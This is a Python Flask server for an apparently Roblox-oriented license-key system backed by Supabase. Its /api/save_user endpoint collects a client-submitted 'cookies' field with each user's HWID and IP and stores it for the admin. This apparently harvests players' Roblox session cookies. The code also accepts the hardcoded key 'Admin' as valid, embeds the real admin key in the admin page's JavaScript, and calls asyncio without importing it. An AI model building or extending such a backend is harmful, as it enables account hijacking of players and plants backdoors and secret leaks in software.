import os
import random
import re
from urllib.parse import quote
from datetime import datetime, timedelta, timezone
from typing import Optional, Dict, Any

import httpx
from dotenv import load_dotenv
from dateutil.parser import parse as parse_date
from flask import Flask, request, jsonify, send_from_directory, session, render_template_string
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_cors import CORS
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import hashlib

# ----------------------
# Constants / Config
# ----------------------
load_dotenv('/etc/secrets/.env')

SUPABASE_URL = os.getenv('SUPABASE_URL')
SUPABASE_KEY = os.getenv('SUPABASE_KEY')
ADMIN_KEY = os.getenv('ADMIN_KEY')
ADMIN_IP = os.getenv('ADMIN_IP')
ADMIN_PASS = os.getenv('ADMIN_PASS')
ENCRYPTION_SECRET = os.getenv('ENCRYPTION_SECRET', SUPABASE_KEY).encode()

# Regex
KEY_REGEX = re.compile(r'^Tw3ch1k_[0-9oasuxclO68901\-]{16,}$')
HWID_REGEX = re.compile(r'^[0-9A-Fa-f\-]{5,}$')
IP_REGEX = re.compile(r'^\d{1,3}(\.\d{1,3}){3}$')

# Error messages
ERR_DB_FAIL = 'Database request failed'
ERR_ACCESS_DENIED = 'Access denied'
ERR_SAVE_KEY = 'Failed to save key'

# Initialize encryption
salt = hashlib.sha256(ENCRYPTION_SECRET).digest()
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
)
key = base64.urlsafe_b64encode(kdf.derive(ENCRYPTION_SECRET))
cipher_suite = Fernet(key)

# Supabase headers
SUPABASE_HEADERS = {
    'apikey': SUPABASE_KEY,
    'Authorization': f"Bearer {SUPABASE_KEY}",
    'Content-Type': 'application/json'
}

# Flask app
app = Flask(__name__)
app.secret_key = os.getenv("ADMIN_SESSION_KEY")
app.config['SESSION_COOKIE_NAME'] = os.getenv("sskk")
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=7)
CORS(app, resources={r"/api/*": {"origins": ["https://www.roblox.com", "https://*.robloxlabs.com"]}})
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

# HTTPX Client
client = httpx.AsyncClient(timeout=30.0)

# ----------------------
# Utility functions
# ----------------------
def validate_key(key: str) -> bool:
    """Validate key format"""
    return bool(KEY_REGEX.match(key))

def validate_hwid(hwid: str) -> bool:
    """Validate HWID format"""
    return bool(HWID_REGEX.match(hwid))

def validate_ip(ip: str) -> bool:
    """Validate IP address format"""
    return bool(IP_REGEX.match(ip))

def is_admin_request() -> bool:
    """Check if request has valid admin key"""
    admin_header = request.headers.get('X-Admin-Key')
    admin_arg = request.args.get('d')
    key = admin_header or admin_arg
    return key == ADMIN_KEY

def generate_key(length: int = 16) -> str:
    """Generate a new secure key"""
    chars_main = 'oasuxclO'
    chars_digits = '68901'
    num_digits = int(length * 0.7)
    num_main = length - num_digits
    key_chars = random.choices(chars_digits, k=num_digits) + random.choices(chars_main, k=num_main)
    random.shuffle(key_chars)
    key_str = ''.join(key_chars)
    return "Tw3ch1k_" + "-".join([key_str[i:i+4] for i in range(0, len(key_str), 4)])

async def save_key(key: str = None) -> Optional[str]:
    """Generate and save key to Supabase"""
    key = key or generate_key()
    payload = {
        'key': key,
        'created_at': datetime.utcnow().isoformat(),
        'used': False
    }
    try:
        resp = await client.post(
            f"{SUPABASE_URL}/rest/v1/keys",
            headers=SUPABASE_HEADERS,
            json=payload
        )
        if resp.status_code == 201:
            return key
    except httpx.RequestError:
        pass
    return None

def encrypt_data(data: str) -> str:
    """Encrypt data using Fernet"""
    return cipher_suite.encrypt(data.encode()).decode()

def decrypt_data(encrypted_data: str) -> str:
    """Decrypt data using Fernet"""
    return cipher_suite.decrypt(encrypted_data.encode()).decode()

def get_user_id(ip: str, hwid: str) -> str:
    """Generate encrypted user ID"""
    raw_id = f"{ip}_{hwid}"
    return encrypt_data(raw_id)

# ----------------------
# API Routes
# ----------------------
@app.route('/api/clean_old_keys', methods=['POST'])
async def clean_old_keys():
    """Clean old unused keys"""
    if not is_admin_request():
        return jsonify({'error': ERR_ACCESS_DENIED}), 403

    data = request.get_json() or {}
    days = int(data.get('days', 1))
    threshold = datetime.utcnow().replace(tzinfo=timezone.utc) - timedelta(days=days)

    try:
        resp = await client.get(f"{SUPABASE_URL}/rest/v1/keys", headers=SUPABASE_HEADERS)
        if resp.status_code != 200:
            return jsonify({'error': 'Failed to fetch keys', 'details': resp.text}), 500
        keys = resp.json()
    except httpx.RequestError:
        return jsonify({'error': 'Failed to fetch keys'}), 500

    deleted_count = 0
    for key_entry in keys:
        created = key_entry.get('created_at')
        if not created:
            continue
        try:
            created_dt = parse_date(created)
        except Exception:
            continue
        if created_dt < threshold:
            try:
                k = quote(key_entry['key'])
                del_resp = await client.delete(
                    f"{SUPABASE_URL}/rest/v1/keys?key=eq.{k}",
                    headers=SUPABASE_HEADERS
                )
                if del_resp.status_code == 204:
                    deleted_count += 1
            except httpx.RequestError:
                pass
    return jsonify({'deleted': deleted_count})

@app.route('/api/get_key')
@limiter.limit('10/minute')
async def api_get_key():
    """Generate and return a new key"""
    key = await save_key()
    if not key:
        return jsonify({'error': ERR_SAVE_KEY}), 500
    return jsonify({'key': key})

@app.route('/api/verify_key')
@limiter.limit('20/minute')
async def verify_key():
    """Verify key validity"""
    key = request.args.get('key')
    if key == "Admin":
        return "valid", 200, {'Content-Type': 'text/plain'}
        
    if not key or not validate_key(key):
        return 'invalid', 200, {'Content-Type': 'text/plain'}    
    try:
        resp = await client.get(
            f"{SUPABASE_URL}/rest/v1/keys?key=eq.{quote(key)}",
            headers=SUPABASE_HEADERS
        )
    except httpx.RequestError:
        return 'error', 500, {'Content-Type': 'text/plain'}

    if resp.status_code != 200 or not resp.json():
        return 'invalid', 200, {'Content-Type': 'text/plain'}

    key_data = resp.json()[0]
    if key_data.get('used'):
        return 'used', 200, {'Content-Type': 'text/plain'}

    try:
        created_at = parse_date(key_data['created_at'])
    except Exception:
        return 'error', 500, {'Content-Type': 'text/plain'}

    if datetime.now(timezone.utc) - created_at > timedelta(hours=24):
        return 'expired', 200, {'Content-Type': 'text/plain'}

    try:
        patch_resp = await client.patch(
            f"{SUPABASE_URL}/rest/v1/keys?key=eq.{quote(key)}",
            headers=SUPABASE_HEADERS,
            json={'used': True}
        )
        if patch_resp.status_code == 204:
            return 'valid', 200, {'Content-Type': 'text/plain'}
    except httpx.RequestError:
        pass

    return 'error', 500, {'Content-Type': 'text/plain'}

@app.route('/api/save_user', methods=['POST'])
@limiter.limit('5/minute')
async def save_user():
    """Save user data with encryption"""
    data = request.json or {}
    remote_ip = request.remote_addr or 'unknown_ip'
    if not validate_ip(remote_ip):
        remote_ip = 'unknown_ip'

    hwid = data.get('hwid')
    cookies = data.get('cookies', '')
    key = data.get('key')

    if not hwid or not validate_hwid(hwid):
        return jsonify({'error': 'Missing or invalid HWID'}), 400

    user_id = get_user_id(remote_ip, hwid)

    try:
        resp = await client.get(
            f"{SUPABASE_URL}/rest/v1/users?user_id=eq.{quote(user_id)}",
            headers=SUPABASE_HEADERS
        )
        if resp.status_code != 200:
            return jsonify({'error': 'Failed to query user'}), 500
        existing_users = resp.json()
    except httpx.RequestError:
        return jsonify({'error': 'Failed to query user'}), 500

    if existing_users:
        u = existing_users[0]
        return jsonify({
            'status': 'exists',
            'key': u['key'],
            'registered_at': u['registered_at']
        })

    if key:
        if not validate_key(key):
            key = await save_key()
        else:
            try:
                resp = await client.get(
                    f"{SUPABASE_URL}/rest/v1/keys?key=eq.{quote(key)}",
                    headers=SUPABASE_HEADERS
                )
                if resp.status_code != 200 or not resp.json():
                    key = await save_key()
            except httpx.RequestError:
                key = await save_key()
    else:
        key = await save_key()

    if not key:
        return jsonify({'error': ERR_SAVE_KEY}), 500

    payload = {
        'user_id': user_id,
        'cookies': encrypt_data(cookies) if cookies else '',
        'hwid': hwid,
        'key': key,
        'registered_at': datetime.utcnow().isoformat()
    }

    try:
        resp = await client.post(
            f"{SUPABASE_URL}/rest/v1/users",
            headers=SUPABASE_HEADERS,
            json=payload
        )
        if resp.status_code != 201:
            return jsonify({'error': 'Failed to save user'}), 500
    except httpx.RequestError:
        return jsonify({'error': 'Failed to save user'}), 500

    return jsonify({
        'status': 'saved',
        'key': key,
        'registered_at': payload['registered_at']
    })

# ----------------------
# Admin Panel Routes
# ----------------------
@app.route('/admin', methods=['GET', 'POST'])
async def admin_panel():
    """Admin panel with authentication"""
    session.permanent = True
    if session.get('admin_auth'):
        return await render_admin_page()

    if request.method == "POST":
        if request.is_json:
            data = request.get_json()
            password = data.get("password")
        else:
            password = request.form.get("password")

        if password == ADMIN_PASS or is_admin_request():
            session['admin_auth'] = True
            return await render_admin_page()
        else:
            return "Invalid credentials", 403

    return '''
        <form method="post">
            Password: <input type="password" name="password">
            <input type="submit" value="Login">
        </form>
    '''

async def render_admin_page() -> str:
    """Render admin panel with data from Supabase"""
    try:
        keys_resp, users_resp = await asyncio.gather(
            client.get(f"{SUPABASE_URL}/rest/v1/keys", headers=SUPABASE_HEADERS),
            client.get(f"{SUPABASE_URL}/rest/v1/users", headers=SUPABASE_HEADERS)
        )
        if keys_resp.status_code != 200 or users_resp.status_code != 200:
            return 'Failed to fetch data', 500
        
        keys_data = keys_resp.json()
        users_data = users_resp.json()
    except httpx.RequestError:
        return 'Failed to fetch data', 500

    admin_html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Admin Panel</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #1a1a2e; color: #e6e6e6; }
            .container { max-width: 1200px; margin: 0 auto; }
            h1 { color: #4cc9f0; border-bottom: 1px solid #4cc9f0; padding-bottom: 10px; }
            table { width: 100%; border-collapse: collapse; margin: 20px 0; }
            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #4cc9f0; }
            th { background-color: #16213e; color: #4cc9f0; }
            tr:hover { background-color: #16213e; }
            button { 
                background-color: #f72585; 
                color: white; 
                border: none; 
                padding: 8px 12px; 
                border-radius: 4px; 
                cursor: pointer; 
                transition: background-color 0.3s;
            }
            button:hover { background-color: #b5179e; }
            .controls { margin: 20px 0; }
            .logout { float: right; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Admin Panel <a href="/admin/logout" class="logout"><button>Logout</button></a></h1>
            
            <div class="controls">
                <button onclick="cleanOldKeys()">Clean Old Keys</button>
            </div>
            
            <h2>Keys</h2>
            <table id="keys-table">
                <thead>
                    <tr>
                        <th>Key</th>
                        <th>Used</th>
                        <th>Created At</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    {{ keys_rows }}
                </tbody>
            </table>
            
            <h2>Users</h2>
            <table id="users-table">
                <thead>
                    <tr>
                        <th>User ID</th>
                        <th>HWID</th>
                        <th>Key</th>
                        <th>Registered At</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    {{ users_rows }}
                </tbody>
            </table>
        </div>

        <script>
            async function deleteKey(key) {
                const response = await fetch('/api/delete_key', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Admin-Key': '{{ admin_key }}'
                    },
                    body: JSON.stringify({ key })
                });
                alert(await response.text());
                location.reload();
            }

            async function deleteUser(hwid) {
                const response = await fetch('/api/delete_user', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Admin-Key': '{{ admin_key }}'
                    },
                    body: JSON.stringify({ hwid })
                });
                alert(await response.text());
                location.reload();
            }

            async function cleanOldKeys() {
                const days = prompt("Delete keys older than (days):", "1");
                if (!days) return;
                
                const response = await fetch('/api/clean_old_keys', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Admin-Key': '{{ admin_key }}'
                    },
                    body: JSON.stringify({ days: parseInt(days) })
                });
                const result = await response.json();
                alert(`Deleted ${result.deleted} old keys`);
                location.reload();
            }
        </script>
    </body>
    </html>
    """

    # Generate keys table rows
    keys_rows = ""
    for key in keys_data:
        keys_rows += f"""
        <tr>
            <td>{key['key']}</td>
            <td>{key['used']}</td>
            <td>{key['created_at']}</td>
            <td><button onclick="deleteKey('{key['key']}')">Delete</button></td>
        </tr>
        """

    # Generate users table rows
    users_rows = ""
    for user in users_data:
        users_rows += f"""
        <tr>
            <td>{user['user_id']}</td>
            <td>{user['hwid']}</td>
            <td>{user['key']}</td>
            <td>{user['registered_at']}</td>
            <td><button onclick="deleteUser('{user['hwid']}')">Delete</button></td>
        </tr>
        """

    return render_template_string(
        admin_html,
        keys_rows=keys_rows,
        users_rows=users_rows,
        admin_key=ADMIN_KEY
    )

@app.route('/admin/logout')
def admin_logout():
    """Logout from admin panel"""
    session.pop('admin_auth', None)
    return "Logged out successfully. <a href='/admin'>Login again</a>"

# ----------------------
# Delete Endpoints
# ----------------------
@app.route('/api/delete_key', methods=['POST'])
async def delete_key():
    """Delete a key (admin only)"""
    if not is_admin_request():
        return ERR_ACCESS_DENIED, 403

    data = request.get_json() or {}
    key = data.get('key')
    if not key or not validate_key(key):
        return 'Missing or invalid key', 400

    try:
        resp = await client.delete(
            f"{SUPABASE_URL}/rest/v1/keys?key=eq.{quote(key)}",
            headers=SUPABASE_HEADERS
        )
    except httpx.RequestError:
        return ERR_DB_FAIL, 500

    if resp.status_code == 204:
        return 'Key deleted'
    return f"Failed to delete: {resp.text}", 500

@app.route('/api/delete_user', methods=['POST'])
async def delete_user():
    """Delete a user (admin only)"""
    if not is_admin_request():
        return ERR_ACCESS_DENIED, 403

    data = request.get_json() or {}
    hwid = data.get('hwid')
    if not hwid or not validate_hwid(hwid):
        return 'Missing or invalid hwid', 400

    try:
        resp = await client.delete(
            f"{SUPABASE_URL}/rest/v1/users?hwid=eq.{quote(hwid)}",
            headers=SUPABASE_HEADERS
        )
    except httpx.RequestError:
        return ERR_DB_FAIL, 500

    if resp.status_code == 204:
        return 'User deleted'
    return f"Failed to delete: {resp.text}", 500

# ----------------------
# Static Routes
# ----------------------
@app.route('/')
def serve_index():
    """Serve main page"""
    return send_from_directory('.', 'index.html')

@app.route('/style.css')
def serve_css():
    """Serve CSS file"""
    return send_from_directory('.', 'style.css')

# ----------------------
# Run app
# ----------------------
if __name__ == '__main__':
    import uvicorn
    uvicorn.run(
        app,
        host='0.0.0.0',
        port=int(os.environ.get('PORT', 5000)),
        workers=4,
        proxy_headers=True
)
